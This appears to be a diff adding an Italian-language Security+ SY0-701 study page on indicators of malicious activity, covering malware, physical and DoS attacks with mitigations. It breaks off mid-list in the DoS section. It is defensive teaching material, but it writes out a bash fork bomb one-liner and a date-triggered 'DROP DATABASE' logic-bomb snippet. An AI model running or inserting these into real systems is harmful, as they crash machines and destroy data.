@@ -1,0 +1,1137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>OBJ — Indicators of Malicious Activity · Security+ SY0-701</title>
+  <link rel="stylesheet" href="../style/style.css" />
+</head>
+<body>
+<nav class="global-nav" aria-label="Navigazione principale">
+  <a href="../index_en.html" class="global-nav-brand">
+    <span>🛡️ CompTIA Security+ SY0-701</span>
+  </a>
+  <div class="global-nav-links">
+    <a href="../index_en.html" class="global-nav-link">Home</a>
+    <a href="../quizzes.html" class="global-nav-link">Quiz</a>
+    <a href="../glossario.html" class="global-nav-link">Glossario</a>
+  </div>
+</nav>
+
+<a href="#main" class="skip-link">Salta al contenuto</a>
+<div class="container"><div class="page">
+
+<div class="breadcrumb">
+  <a href="../index_en.html">General Index</a>
+  <span>Dominio 2 — Threats, Vulnerabilities and Mitigations</span>
+  <span>OBJ 2.4 — Indicatori di attività malevola</span>
+</div>
+
+<header>
+  <h1>OBJ 2.4 — Indicators of Malicious Activity</h1>
+</header>
+
+<div class="chapter-meta">
+  <p class="manual-reference-line"><span>📖</span> <strong>Manual Reference:</strong> Chapter 3: Codice malevolo</p>
+  <p>CompTIA Security+ SY0-701 · Dominio 2 — Threats, Vulnerabilities and Mitigations · Exam weight: 22%</p>
+  <p><strong>Objective ufficiale:</strong> <em>Given a scenario, analyze indicators of malicious activity.</em></p>
+  <p><strong>Objectives covered:</strong> <span class="objectives-tag">2.4</span> <span class="weight-badge">D2 = 22%</span></p>
+  <p><strong>Prerequisites:</strong> <a href="en_obj2_3_vulnerabilities.html">OBJ 2.3 — Tipi di vulnerabilità</a> · <a href="en_obj1_4_cryptography.html">OBJ 1.4 — Crittografia</a></p>
+  <p><strong>Correlati:</strong> <a href="en_obj2_5_mitigation.html">OBJ 2.5 — Tecniche di mitigazione</a></p>
+</div>
+
+<div class="layout">
+
+<nav class="toc-sticky" aria-label="Indice">
+  <div class="toc-section">Malware</div>
+  <a href="#ransomware">Ransomware</a>
+  <a href="#trojan">Trojan</a>
+  <a href="#worm">Worm</a>
+  <a href="#spyware-key">Spyware / Keylogger</a>
+  <a href="#altri-malware">Virus · Bloatware · Rootkit</a>
+  <a href="#logic-bomb">Logic bomb</a>
+
+  <div class="toc-section">Attacchi fisici</div>
+  <a href="#phys-brute">Brute force fisico</a>
+  <a href="#rfid">RFID cloning</a>
+  <a href="#environmental">Environmental</a>
+
+  <div class="toc-section">Attacchi di rete</div>
+  <a href="#ddos">DDoS (Amplified / Reflected)</a>
+  <a href="#dns-attacks">DNS attacks</a>
+  <a href="#wireless">Wireless attacks</a>
+  <a href="#on-path">On-path (MitM) & Snooping</a>
+  <a href="#spoofing">Spoofing (Identità e Falsificazioni)</a>
+  <a href="#cred-replay">Credential replay</a>
+
+  <div class="toc-section">Attacchi applicativi</div>
+  <a href="#injection">Injection</a>
+  <a href="#priv-esc">Privilege escalation</a>
+  <a href="#forgery">Request Forgery</a>
+  <a href="#dir-trav">Directory traversal</a>
+
+  <div class="toc-section">Attacchi crittografici</div>
+  <a href="#crypto-attacks">Downgrade · Collision · Birthday</a>
+
+  <div class="toc-section">Attacchi alle password</div>
+  <a href="#spraying">Password spraying</a>
+  <a href="#pass-hash">Pass-the-hash</a>
+
+  <div class="toc-section">Indicatori</div>
+  <a href="#indicators">Indicators of Compromise</a>
+
+  <div class="toc-section">Verify</div>
+  <a href="#quiz-section">Interactive Quiz</a>
+  <a href="#flashcard">Flashcard</a>
+</nav>
+
+<main class="content" id="main">
+
+<!-- ══ INTRO ════════════════════════════════════════════════════ -->
+<section id="intro">
+  <h2>Leggere gli indicatori: dalla sintomatologia alla diagnosi</h2>
+  <p>
+    L'obiettivo 2.4 non chiede di sapere <em>come</em> costruire un attacco, ma di
+    saper riconoscere i suoi <strong>indicatori (indicators)</strong> — i segnali che
+    rimangono nel sistema dopo o durante un'attività malevola. Come un medico che
+    diagnostica una malattia dai sintomi senza averla vista formarsi, un analista di
+    sicurezza deve leggere log, traffico di rete, comportamento dei processi e
+    anomalie di sistema per identificare cosa sta accadendo.
+  </p>
+  <p>
+    Le questions d'esame presentano sempre uno <em>scenario</em>: un log, un output di
+    monitoring, un comportamento anomalo. Il compito è classificare correttamente
+    l'attività. Il metodo: identificare prima la <em>categoria</em> dell'attacco
+    (malware, rete, applicativo, crittografico, password), poi il tipo specifico.
+  </p>
+</section>
+
+
+<!-- ══ MALWARE ══════════════════════════════════════════════════ -->
+<section id="malware">
+  <h2>Attacchi malware (Malware Attacks)</h2>
+
+  <h3 id="ransomware">Ransomware</h3>
+  <p>
+    Il <strong>ransomware</strong> è malware che cifra i file della vittima e richiede
+    un riscatto per fornire la chiave di decifratura. È la minaccia economicamente più
+    impattante degli ultimi anni. L'indicatore caratteristico è la presenza di file con
+    estensioni anomale (es. <code>.ryk</code>, <code>.locked</code>, <code>.encrypted</code>)
+    e di un file di testo o immagine con le istruzioni per il pagamento del riscatto.
+  </p>
+  <dl class="termlist">
+    <dt>Indicatori tipici</dt>
+    <dd>File con estensione modificata in modo non riconosciuto (: <code>.ryk</code>). Nota di riscatto (ransom note) sul desktop o in ogni cartella cifrata. CPU e I/O disco elevati durante la fase di cifratura. Accesso massiccio e sequenziale ai file in breve tempo. Comunicazione outbound verso indirizzi sospetti (C2 per la chiave).</dd>
+    <dt>Ransomware-as-a-Service (RaaS)</dt>
+    <dd>Il modello operativo del crimine organizzato: il gruppo sviluppa il ransomware e lo affitta ad affiliati che si occupano della distribuzione, dividendo il riscatto. Ha democratizzato gli attacchi ransomware aumentandone il volume.</dd>
+    <dt>Double extortion</dt>
+    <dd>Tecnica moderna: l'attaccante non solo cifra i dati ma li esfil prima, minacciando di pubblicarli se il riscatto non viene pagato — anche se la vittima ripristina dal backup.</dd>
+    <dt>Mitigazione principale</dt>
+    <dd>Esecuzione sistematica di backup scollegati fisicamente o in cloud non sovrascrivibile (air-gapped o immutable backup), limitazione dell'accesso in scrittura e isolamento tempestivo tramite agenti EDR dei comportamenti di crittografia di massa non approvati.</dd>
+  </dl>
+
+  <div class="exam-tip">
+    <strong>EXAM TIP — Ransomware: l'estensione è la chiave</strong><br>
+    "All user workstations and servers are displaying a message associated with files
+    containing extension .ryk" → <strong>Ransomware</strong>.
+    L'estensione anomala + messaggio di riscatto = indicatori diagnostici del ransomware.
+    Non è un virus (che non cifra necessariamente), non è spyware (che non blocca i file).
+  </div>
+
+  <h3 id="trojan">Trojan (Cavallo di Troia)</h3>
+  <p>
+    Un <strong>Trojan (Trojan Horse)</strong> è malware mascherato da software legittimo
+    o utile. L'utente lo installa volontariamente credendo si tratti di un'applicazione
+    desiderabile (gioco, utility, codec, crack di software a pagamento). Una volta
+    installato, esegue funzionalità malevole nascoste: aprire backdoor, scaricare altro
+    malware, registrare l'attività dell'utente.
+  </p>
+  <p>
+    Il Trojan <em>non si replica autonomamente</em> (si distingue dal worm per questo)
+    e non infetta altri file (si distingue dal virus). Richiede che l'utente lo installi
+    deliberatamente, sfruttando l'inganno. Lo scenario  (software scaricato
+    da forum online che genera traffico outbound su porta non comune) descrive un Trojan
+    con <strong>backdoor</strong> integrata.
+  </p>
+  <p>
+    <strong>• Mitigazione principale:</strong> Attivazione del controllo delle applicazioni (Application Control / Whitelisting) per inibire l'avvio di file eseguibili non firmati digitalmente o provenienti da directory non autorizzate, requisire i privilegi minimi (Least Privilege) agli utenti finali per bloccare installazioni di programmi imprevisti, e ricorrere ad agenti antimalware EDR.
+  </p>
+
+  <h3 id="worm">Worm</h3>
+  <p>
+    Un <strong>worm</strong> è malware che si replica e si propaga autonomamente
+    attraverso la rete <em>senza bisogno di intervento umano</em>: non richiede
+    che l'utente clicchi su un link, apra un allegato o installi qualcosa. Sfrutta
+    vulnerabilità di servizi di rete per infettare sistemi raggiungibili.
+    È questa caratteristica di auto-propagazione che lo distingue da tutti gli altri
+    malware.
+  </p>
+  <dl class="termlist">
+    <dt>Indicatori tipici</dt>
+    <dd>Traffico di rete elevato e anomalo su porte di servizi specifici (: TCP 445 = SMB, tipico di worm come WannaCry). Latenza di rete elevata. Sistemi che tentano di connettersi a molti altri host in sequenza. Nessun intervento utente rilevato prima dell'infezione.</dd>
+    <dt>Vettori tipici</dt>
+    <dd>Vulnerabilità nei servizi di rete esposti (SMB, RDP, SSH). Una volta entrato in un sistema, il worm scansiona automaticamente altri host raggiungibili e ripete il processo.</dd>
+    <dt>Mitigazione principale</dt>
+    <dd>Rigida segmentazione della rete aziendale in VLAN isolate per bloccare i movimenti laterali automatici, disattivazione o limitazione dei protocolli e porte legacy non necessari (es. SMBv1, porta 445 se non indispensabile), e installazione automatizzata e proattiva delle patch di sicurezza sui servizi di rete.</dd>
+  </dl>
+
+  <div class="pitfall">
+    <strong>ATTENZIONE — Worm vs Virus vs Trojan</strong><br>
+    <strong>Worm:</strong> si propaga autonomamente, nessun intervento umano, sfrutta
+    vulnerabilità di rete. Indicatore: alto traffico di rete, molti sistemi infettati
+    simultaneamente.<br>
+    <strong>Virus:</strong> si replica infettando altri file, richiede esecuzione del
+    file infetto da parte dell'utente.<br>
+    <strong>Trojan:</strong> si maschera da software legittimo, richiede installazione
+    volontaria, non si replica autonomamente.
+  </div>
+
+  <h3 id="spyware-key">Spyware e Keylogger</h3>
+  <p>
+    Lo <strong>spyware</strong> è malware che raccoglie informazioni sull'utente e le trasmette a terzi senza consenso: cronologia di navigazione, abitudini d'uso, credenziali e dati personali. È spesso installato insieme ad altro software (bundling) o tramite siti web compromessi. Opera silenziosamente in background.
+  </p>
+  <p>
+    Il <strong>keylogger</strong> è un tipo specializzato di spyware che registra ogni tasto premuto dall'utente, catturando credenziali, messaggi privati, numeri di carta di credito e qualsiasi altra informazione digitata. Può essere software (processo che intercetta gli eventi tastiera) o hardware (dispositivo fisico tra tastiera e PC).
+  </p>
+  <dl class="termlist">
+    <dt>Indicatori keylogger software</dt>
+    <dd>Processo sconosciuto in esecuzione con permessi elevati. Traffico outbound verso IP sospetti con dati cifrati. Degradazione delle prestazioni. Logs di sistema che mostrano accesso a API di hook della tastiera.</dd>
+    <dt>Indicatori keylogger hardware</dt>
+    <dd>Dispositivo fisico tra il connettore della tastiera e la porta USB/PS2 del PC. Rilevabile solo con ispezione fisica del cablaggio.</dd>
+    <dt>Mitigazione principale</dt>
+    <dd>Uso di soluzioni anti-keylogger e agenti EDR per intercettare hook non autorizzati alle API delle chiamate di tastiera. Cifratura forzata di tutti i dati sensibili in transito, e adozione obbligatoria di MFA per impedire che le password carpite dal keylogger sblocchino gli account. Per i dispositivi hardware, esecuzione di ispezioni fisiche periodiche e sistematiche nel retro dei computer degli uffici aziendali.</dd>
+  </dl>
+
+  <h3 id="altri-malware">Virus · Bloatware · Rootkit · Beaconing</h3>
+  <dl class="termlist">
+    <dt>Virus</dt>
+    <dd>Malware che si replica infettando altri file eseguibili. Richiede che l'utente esegua il file infetto per attivarsi e propagarsi. Non si diffonde autonomamente sulla rete (a differenza del worm). Indicatore: hash di file eseguibili cambiato senza patch applicate.<br><strong>• Mitigazione principale:</strong> Analisi di File Integrity Monitoring (FIM) per allertare istantaneamente su modifiche non autorizzate degli hash dei moduli del sistema operativo, integrate con antivirus con motori euristici capaci di rilevare file infettati.</dd>
+    <dt>Bloatware</dt>
+    <dd>Software indesiderato pre-installato dai produttori (tipicamente su PC nuovi) o installato come bundle. Non sempre malevolo, ma consuma risorse, riduce le prestazioni e può introdurre vulnerabilità. L'indicatore è la presenza di applicazioni non richieste che si avviano automaticamente.<br><strong>• Mitigazione principale:</strong> Distribuzione sistematica di immagini standard prefabbricate e pulite (Gold Images) sui PC aziendali di nuova adozione, blocco dell'onboarding hardware non standard e policies attive di controllo software sui client.</dd>
+    <dt>Rootkit</dt>
+    <dd>Malware progettato per nascondere la sua presenza e quella di altri malware al sistema operativo e ai tool di sicurezza. Modifica le API di sistema per restituire risultati alterati: se cerchi il processo malevolo, il rootkit lo nasconde dall'elenco dei processi. Indicatore classico: hash di file di sistema cambiato senza patch recenti (, : cmd.exe con hash modificato = rootkit). Può essere introdotto tramite side loading.<br><strong>• Mitigazione principale:</strong> Abilitazione rigorosa del Secure Boot UEFI per garantire l'avvio esclusivo di firmware e driver firmati e provvisti di chiavi crittografiche fidate, e utilizzo di agenti EDR integrati a livello kernel in grado di ispezionare le chiamate profonde di memoria.</dd>
+    <dt>Fileless Malware (Malware senza file)</dt>
+    <dd>Un malware avanzato che non salva file eseguibili tradizionali sul disco rigido (hard drive), eludendo le scansioni degli antivirus tradizionali basati su firme. Opera iniettando il proprio codice malevolo direttamente nello spazio di memoria RAM di processi legittimi del sistema operativo (es. <code>PowerShell</code>, <code>WMI</code> o <code>cmd.exe</code>). Sfrutta strumenti integrati di amministrazione per svolgere le sue attività (Living-off-the-Land).<br><strong>• Mitigazione principale:</strong> Configurazione del Constrained Language Mode in PowerShell per limitare drasticamente le API richiamabili, abilitazione di log dettagliati dei blocchi di codice PowerShell (Script Block Logging) convogliati al SIEM, e adozione di agenti EDR avanzati per scansionare l'integrità della memoria RAM.</dd>
+    <dt>Beaconing (Comunicazione a Beacon)</dt>
+    <dd>Il comportamento tipico di un malware installato che, ad intervalli regolari o randomizzati, effettua connessioni outbound (pings) verso il proprio server di <strong>Command and Control (C2)</strong> esterno dell'attaccante. Serve a segnalare che l'host è online ed infettato, ed a ricevere ed eseguire nuovi ordini o inviare dati catturati. La telemetria di rede evidenzia pattern costanti di traffico intermittente a intervalli fissi (es: ogni 10 secondi esatti) verso un medesimo IP non aziendale.<br><strong>• Mitigazione principale:</strong> Analisi del proxy e firewall aziendale per intercettare traffici a periodicità fissa (statistiche di ricorrenza), implementazione di DNS Sinkholing per reindirizzare le richieste verso i domini di comando noti dei criminali, e decifratura e ispezione SSL/TLS del traffico web in uscita.</dd>
+  </dl>
+
+  <div class="exam-tip">
+    <strong>EXAM TIP — Rootkit: il file integrity monitoring è il rilevatore</strong><br>
+    Scenario: "FIM alert: hash di cmd.exe cambiato. None patch applicata negli ultimi
+    2 mesi" → <strong>Rootkit</strong>. Il rootkit modifica
+    file di sistema critici. Senza patch che giustifichino la modifica, la causa è
+    malware. Non è una collision crittografica (estremamente improbabile su file reali),
+    non è una snapshot (non modifica il file).
+  </div>
+
+  <h3 id="logic-bomb">Logic bomb (Bomba logica)</h3>
+  <p>
+    Una <strong>logic bomb (bomba logica)</strong> è codice malevolo dormiente che si
+    attiva solo quando si verificano condizioni specifiche: una data, un'ora, l'assenza
+    dell'utente dal sistema, il licenziamento di un account. Non è rilevabile finché
+    le condizioni non si verificano perché sembra codice legittimo. È tipicamente
+    piantata da un <em>insider malevolo</em> — un dipendente scontento o in procinto
+    di essere licenziato — che vuole colpire l'organizzazione dopo la sua partenza.
+  </p>
+  <p>
+    <strong>• Mitigazione principale:</strong> Implementazione rigorosa della separazione dei compiti (Separation of Duties), adozione di un modello di revisione bilaterale del codice sorgente e pianificazione delle pull request (Peer Review) per tutti gli script amministrativi, e auditing mirato e auditing dei log d'amministrazione in prossimità dell'onboarding e offboarding delle utenze privilegiate.
+  </p>
+
+  <div class="example-box">
+    <strong>Esempio pratico — Logic bomb da insider (OBJ 2.3 ·  + OBJ 2.4 · )</strong><br>
+    Il codice: <code>IF DATE() = "01/30/2023" THEN BEGIN DROP DATABASE WebShopOnline; END</code>
+    inserito nello script di backup da un DBA in uscita è una logic bomb classica:
+    condizione = data specifica; payload = eliminazione del database.
+    Appariva come codice legittimo per mesi, si attiva silenziosamente alla data
+    programmata. Il primo passo investigativo: verificare i DBA recentemente licenziati.
+  </div>
+</section>
+
+
+<!-- ══ ATTACCHI FISICI ═══════════════════════════════════════════ -->
+<section id="physical-attacks">
+  <h2>Attacchi fisici (Physical Attacks)</h2>
+
+  <h3 id="phys-brute">Brute force fisico</h3>
+  <p>
+    Il <strong>brute force fisico</strong> nel contesto degli attacchi fisici si riferisce
+    al tentativo di accedere fisicamente a un'area o a un dispositivo attraverso la
+    forza: forzare serrature, rompere vetri, tagliare recinzioni. Da non confondere con
+    il brute force informatico (tentativi di password): il contesto è l'accesso fisico
+    non autorizzato tramite forza diretta.
+  </p>
+  <p>
+    <strong>• Mitigazioni principali:</strong> Installazione di barriere fisiche rinforzate (porte blindate anti-scasso di classe elevata, infissi protetti, recinzioni metalliche dotate di sensori di vibrazione), impiego di guardie giurate per ronde fisiche e sorveglianza attiva, cablaggio di sensori volumetrici a infrarosso e sistemi CCTV di monitoraggio continuo con rilevamento automatico di intrusioni.
+  </p>
+
+  <h3 id="rfid">RFID cloning (Clonazione RFID)</h3>
+  <p>
+    La <strong>clonazione RFID (RFID cloning)</strong> è la copia non autorizzata dei
+    dati presenti in un badge o in una scheda di accesso RFID/NFC. Un lettore RFID
+    portatile nascosto vicino al badge legittimo della vittima può copiare i dati
+    del badge in pochi secondi, senza che la vittima se ne accorga. Il clone viene
+    poi usato per accedere fisicamente alle aree protette come se fosse il badge
+    originale.
+  </p>
+  <p>
+    L'indicatore caratteristico è il log di accesso fisico che mostra lo stesso badge
+    usato in più luoghi in un intervallo di tempo impossibile (<em>impossible travel</em>)
+    o in rapida sequenza sullo stesso varco (: multiple entries from the same
+    employee ID badge within a two-minute period).
+  </p>
+  <p>
+    <strong>• Mitigazioni principali:</strong> Sostituzione dei badge legacy con carte RFID a crittografia avanzata (es. MIFARE DESFire EV3, iCLASS SE) resistenti alla clonazione tramite handshake crittografico mutuale, utilizzo obbligatorio di borsette o tessere protettive schermate (Faraday sleeves) per i dipendenti, e implementazione di un secondo fattore di autenticazione ai varchi delle aree critiche (biometria o tastierino PIN).
+  </p>
+
+  <div class="exam-tip">
+    <strong>EXAM TIP — RFID cloning: l'indicatore è la duplicazione temporale</strong><br>
+    "Multiple entries from an employee's ID badge within a two-minute period" →
+    <strong>RFID cloning</strong>. Non è tailgating (che è una persona
+    che segue fisicamente un'altra senza usare il badge). Non è shoulder surfing
+    (che riguarda l'osservazione di informazioni visualizzate). La rapidità degli
+    accessi sullo stesso badge indica che è stato clonato e usato da un'altra persona.
+  </div>
+
+  <h3 id="environmental">Environmental attacks (Attacchi ambientali)</h3>
+  <p>
+    Gli <strong>attacchi ambientali (environmental attacks)</strong> sfruttano o
+    provocano condizioni ambientali avverse per causare danni ai sistemi IT:
+    sbalzi di tensione, variazioni di temperatura, umidità eccessiva, interferenze
+    elettromagnetiche, o danni fisici deliberati (allagamento, incendio, sabotaggio
+    degli impianti di climatizzazione). Un data center senza sistemi di protezione
+    ambientali adeguati (UPS, HVAC, sistema antincendio) è vulnerabile anche ad
+    attacchi non informatici.
+  </p>
+  <p>
+    <strong>• Mitigazioni principali:</strong> Installazione di impianti HVAC ridondanti per il controllo termico e dell'umidità con sonde monitorate in tempo reale, implementazione di UPS con stabilizzatori di frequenza e alternatori d'emergenza diesel per interruzioni di corrente, posizionamento di sistemi di estinzione incendi a saturazione di gas pulito (es. FM200) e sensori di allagamento sotto il pavimento galleggiante.
+  </p>
+</section>
+
+
+<!-- ══ ATTACCHI DI RETE ══════════════════════════════════════════ -->
+<section id="network-attacks">
+  <h2>Attacchi di rete (Network Attacks)</h2>
+
+  <h3 id="ddos">Denial of Service (DoS, DDoS, PDoS) e Attacchi di Network Flood</h3>
+  <p>
+    Il <strong>Denial of Service (DoS - Negazione di Servizio)</strong> è una classe fondamentale di attacchi informatici progettati per sabotare la disponibilità (Availability) di un sistema o servizio di rete, impedendo agli utenti legittimi di accedervi. A differenza degli attacchi volti all'esfiltrazione di informazioni, il DoS punta esclusivamente all'interruzione operativa tramite consumo di risorse hardware, logiche o di rete.
+  </p>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">Classificazioni su Scala e Impatto: DoS vs DDoS vs PDoS</h4>
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 25px;">
+    <dt>Denial of Service (DoS) — Sorgente Singola</dt>
+    <dd>L'attacco origina da un singolo computer o da una sola connessione di rete verso il bersaglio. Spesso sfrutta vulnerabilità applicative o sfasamenti software per mandare in crash la risorsa (es. tramite un exploit mirato) o consumare la banda di server minori.</dd>
+
+    <dt>Distributed Denial of Service (DDoS) — Sorgenti Distribuite (Botnet)</dt>
+    <dd>L'attacco viene condotto in modo coordinato da centinaia o migliaia di macchine infette controllate da remoto dall'attaccante, collettivamente denominate <strong>Botnet (o rete zombi)</strong>. La natura distribuita amplifica enormemente il volume di traffico generato e rende impraticabile la mitigazione basata sul blocco di un singolo IP sorgente.</dd>
+
+    <dt>Permanent Denial of Service (PDoS) — Phlashing</dt>
+    <dd>Noto anche come <strong>phlashing</strong>, il PDoS non si limita a un blocco temporaneo dei servizi, ma mira a danneggiare in modo permanente e irreversibile il firmware o l'hardware dei dispositivi fisici (come router, switch di rete, termostati industriali o IoT). L'hacker sfrutta falle di autenticazione o vulnerabilità di sicurezza per installare un upgrade di firmware malevolo o corrotto proprio nella memoria EEPROM del dispositivo. Una volta riavviato con il firmware difettoso, l'hardware si "bricca" (diventando inerte come un mattone), richiedendo la reinstallazione manuale in laboratorio, il flashing a basso livello con chip reader fisici, o la completa sostituzione hardware.</dd>
+  </dl>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">I Vettori di Flood Attack (Attacchi di Inondazione)</h4>
+  <p>
+    Un <strong>Flood Attack (Attacco di inondazione)</strong> descrive il tentativo generico di travolgere un host o l'infrastruttura di rete bersaglio tempestandoli con una mole spropositata di richieste o pacchetti dati, fino a provocarne la saturazione e il collasso. Tra le varianti principali si distinguono:
+  </p>
+  <ul style="margin-left: 20px; line-height: 1.6; margin-bottom: 20px;">
+    <li><strong>Ping Flood (Flood ICMP)</strong>: Massiccia e costante trasmissione di pacchetti ICMP Echo Request (i comuni ping) inviata al bersaglio il più velocemente possibile, spesso sfruttando strumenti automatizzati o botnet. Il computer vittima si vede costretto a mobilitare risorse di calcolo per analizzare e spedire tempestivamente a sua volta un pacchetto ICMP Echo Reply per ogni richiesta ricevuta, finendo rapidamente per esaurire sia la propria larghezza di banda di rete sia i cicli utili di CPU.</li>
+    <li><strong>SYN Flood (Saturazione di Connessione TCP)</strong>: Sfrutta una debolezza intrinseca nell'handshake a tre vie (3-way handshake) del protocollo TCP. L'attaccante invia un'ondata costante di segmenti di richiesta connessione <code>SYN</code> verso il server vittima usando indirizzi IP sorgente falsificati (spoofing). Il server risponde a ciascun pacchetto allocando uno slot in memoria (nella coda di connessione half-open o <code>backlog queue</code>) e rispedendo un pacchetto <code>SYN-ACK</code>. Poiché l'IP sorgente è falso o l'attaccante ignora intenzionalmente lo scambio, il server non riceverà mai il pacchetto finale <code>ACK</code> di completamento, lasciando le connessioni in uno stato di attesa parziale fino al timeout. Quando la coda backlog si riempie del tutto, il server non può più accettare nuove connessioni legittime.</li>
+  </ul>
+
+  <div class="example-box">
+    <strong>Esempio di Log del Firewall durante un a SYN Flood:</strong><br>
+    Log: molti IP sorgente differenti inviano pacchetti con flag SYN alla stessa porta del server (es. 100.50.20.7:443) nello stesso secondo, ma senza alcuna risposta ricevuta del tipo ACK. Questo pattern di mezzo handshake è tipico della saturazione delle risorse di socket.
+  </div>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">Esaurimento Risorse Locale: Fork Bomb</h4>
+  <p>
+    A volte il Denial of Service non richiede un bombardamento esterno sulla scheda di rete, ma può essere originato all'interno del sistema operativo stesso tramite esecuzione di codice dannoso locale.
+  </p>
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 25px;">
+    <dt>Fork Bomb (Bomba Fork)</dt>
+    <dd>È una tipologia di attacco DoS ad esaurimento risorse eseguito localmente. Consiste in un frammento di script o riga di comando che istruisce il sistema operativo a duplicare in modo ricorsivo e infinito i propri processi (utilizzando la chiamata di sistema <code>fork()</code> sui sistemi Unix o chiamate analoghe in ambiente Windows). Un esempio classico in ambiente bash è <code>:(){ :|:&amp; };:</code>. Duplicandosi esponenzialmente, la bomba consuma rapidamente la tabella dei processi del sistema operativo (esaurimento dei PID) e satura l'utilizzo dei thread e della CPU. Di conseguenza, il sistema operativo si congela (freeze) e diventa incapace di avviare qualsiasi nuovo programma o comando utile, rendendo necessario l'hard-reset fisico della macchina.</dd>
+  </dl>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">Tecniche Avanzate di DDoS: Amplified e Reflected</h4>
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 25px;">
+    <dt>Amplified DDoS (DDoS Amplificato)</dt>
+    <dd>Sfrutta protocolli di rete UDP privi di stato (stateless), fra cui DNS, NTP, SSDP o SNMP. L'attore invia query appositamente progettate a server pubblici su Internet che fungono da intermediari involontari dell'attacco. Queste richieste sono caratterizzate da un payload minuscolo ma strutturato per forzare il server a generare una risposta di output gigantesca (es. una richiesta DNS di pochi byte che richiede un record completo TXT con chiavi crittografiche, che può innescare un fattore di amplificazione fino a 50x o 100x). Inviando query a centinaia di server, l'attaccante converte una modesta connessione domestica in un fiume inondante diretto alla vittima.</dd>
+
+    <dt>Reflected DDoS / Reflection Attack (DDoS Riflesso)</dt>
+    <dd>Opera in stretta sinergia con l'amplificazione e si basa sullo <strong>spoofing dell'IP sorgente</strong>. L'attaccante invia le sue richieste ai server intermedi falsificando l'indirizzo IP di origine dei pacchetti, inserendovi proprio l'IP della vittima. Di conseguenza, i server intermedi rifiuteranno di rispondere all'attaccante vero e proprio, ma invieranno l'interezza del traffico di risposta (molto più grande) direttamente alla vittima, mascherando l'identità dell'aggressore reale e facendo apparire i server legittimi di terze parti come generatori del traffico malevolo.</dd>
+  </dl>
+
+  <div class="exam-tip">
+    <strong>EXAM TIP — DDoS reflected: l'indicatore DNS</strong><br>
+    In uno scenario d'esame vedi: "Server DNS: CPU e utilizzo memoria minimi, ma l'interfaccia di rete è inondata di traffico in ingresso. I log mostrano un volume infinitesimo di richieste DNS inoltrate da questo server" → <strong>Reflected DoS</strong>. Il server DNS non sta generando ed elaborando il traffico: lo sta semplicemente <em>ricevendo</em> in quanto vittima finale di un attacco riflesso, dove un attaccante esterno ha falsificato l'IP sorgente del server DNS inviandolo a molteplici nodi su Internet.
+  </div>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">Misure di Hardening e Mitigazione degli Attacchi DoS</h4>
+  <p>
+    La difesa da attacchi volumetrici e di inondazione logica richiede l'interfaccia di molteplici metodologie e strumentazioni coordinate a vari livelli dell'infrastruttura:
+  </p>
+
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 25px;">
+    <dt>Flood Guards (Sbarramenti anti-flood)</dt>
+    <dd>Si tratta di funzionalità logiche integrate direttamente sui dispositivi di connettività di rete (come switch, router, firewall e Load Balancer). I flood guards monitorano in tempo reale e limitano la quantità massima di pacchetti, connessioni o larghezza di banda consumabili da un singolo IP sorgente o su una determinata interfaccia di rete. Se ad esempio un computer supera una soglia predefinita di pacchetti SYN inviati al secondo, il Flood Guard interviene silenziando (drop) l'IP molesto ed inibendone il traffico sul nascere prima dell'esaurimento memoria del server.</dd>
+
+    <dt>Timeout Configuration (Ottimizzazione dei Timeout)</dt>
+    <dd>La regolazione fine delle impostazioni di timeout a livello di sistema operativo e server web (es. accorciando il tempo in cui si attende la risposta del client prima di chiudere un socket incompiuto) è una difesa essenziale contro gli attacchi di inondazione lenti come Slowloris, liberando immediatamente le risorse allocate in memoria per agevolare il transito del traffico legittimo.</dd>
+
+    <dt>Blackhole Routing (Instradamento a Buco Nero) & Sinkhole</dt>
+    <dd>
+      Due tecniche avanzate di deviazione del traffico usate dagli ingegneri di rete:
+      <ul style="margin-left: 20px; margin-top: 5px; line-height: 1.6;">
+        <li><strong>Blackhole Routing (Null0)</strong>: Se un IP o subnet interno è vittima di un DDoS di proporzioni immani capace di intasare l'intera dorsale aziendale, l'amministratore cambia le regole di routing di prossimità inviando tutto il traffico diretto a quell'IP bersaglio verso un'interfaccia virtuale fittizia priva di uscita (denominata <code>Null0</code> o buco nero). Il traffico viene così "inghiottito" e scartato istantaneamente a livello di carrier. Sebbene l'IP vittima rimanga irraggiungibile (DoS riuscito), si salva l'operatività del resto dell'intera rete aziendale ed infrastruttura correlata.</li>
+        <li><strong>DNS Sinkhole / DNS Blackhole (Pozzo DNS)</strong>: Consiste nel manipolare il server DNS aziendale per restituire deliberatamente un indirizzo IP fasullo o non instradabile (es. <code>0.0.0.0</code> o una pagina di avvertimento controllata) per determinati nomi di dominio classificati come pericolosi o facenti parte di una Command &amp; Control (C2) di una Botnet. In questo modo si intercettano, deviano e neutralizzano le richieste che i dispositivi infetti interni tentano di fare verso Internet, impedendo loro di allinearsi con l'hacker.</li>
+      </ul>
+    </dd>
+
+    <dt>Intrusion Prevention System (IPS) Inline</dt>
+    <dd>I sistemi di sicurezza <strong>IPS (Intrusion Prevention System)</strong> posizionati in modalità <em>inline</em> (inseriti direttamente nel flusso primario del traffico di rete) ispezionano ogni singolo pacchetto in tempo reale. Grazie all'analisi euristica ed all'identificazione di firme di attacco note, l'IPS può rilevare anomalie di pacchetti alterati (come pacchetti orfani o deformati) ed intraprendere attivamente azioni per bloccarle e azzerarle proattivamente prima che arrechino disturbo o tocchino l'host finale.</dd>
+
+    <dt>Resilienza tramite Elastic Cloud Infrastructure (Infrastruttura Cloud Elastica)</dt>
